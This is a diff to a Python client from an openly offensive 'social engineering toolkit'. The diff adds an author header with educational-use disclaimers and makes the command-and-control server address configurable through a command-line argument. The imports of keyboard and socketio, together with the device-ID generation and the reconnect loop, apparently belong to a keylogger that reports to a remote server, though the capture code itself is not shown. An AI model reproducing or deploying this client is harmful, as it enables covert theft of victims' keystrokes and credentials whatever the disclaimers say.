@@ -1,9 +1,33 @@
+#!/usr/bin/env python
+
+"""
+SocialEngineer - Social Engineering Toolkit
+-------------------------------------------
+
+Author      : Karthikeyan (https://karthithehacker.com)
+GitHub      : https://github.com/karthi-the-hacker
+Project     : SocialEngineer - An all-in-one CLI framework for social engineering
+
+License     : Open-source — strictly for educational and ethical hacking purposes ONLY.
+
+Note to Users:
+--------------
+🔐 This tool is intended solely for educational use, research, and authorized security testing.
+🚫 Unauthorized use of this tool on networks you do not own or lack permission to test is illegal.
+❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author.
+
+Warning to Code Thieves:
+------------------------
+❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source principles.
+🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
+✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
+"""
 import socketio
 import keyboard
 import uuid
 import threading
 import time
-
+import sys
 # Generate unique device ID
 device_id = str(uuid.uuid4())  # You can store to disk to persist
 
@@ -14,7 +38,7 @@ def connect_to_server():
     while True:
         try:
             print("[*] Trying to connect to server...")
-            sio.connect("http://192.168.0.4:5000")
+            sio.connect(f"http://{sys.argv[1]}:5000")
             print("[+] Connected to server!")
             break
         except Exception as e:
